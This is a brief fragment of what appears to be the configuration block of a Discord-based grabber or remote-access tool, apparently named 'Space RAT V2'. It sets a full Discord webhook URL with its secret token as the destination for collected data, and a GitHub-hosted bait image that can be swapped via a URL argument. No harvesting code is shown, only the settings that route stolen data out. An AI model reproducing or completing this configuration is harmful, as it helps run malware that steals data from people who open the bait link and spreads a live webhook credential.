...
config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1029843218252173443/p3jNyAb--Zpm7ICs1C6yAGLcsHAuk-Er_R_icn0oxPTUkXgnXdTFHIPhQiVZsL5fc3A3",
    "image": "https://github.com/123Coder231youneverknow/duwbndhsbdcudnhq/blob/main/Space%20RAT%20V2.png?raw=true", # You can also have a custom image by using a URL argument
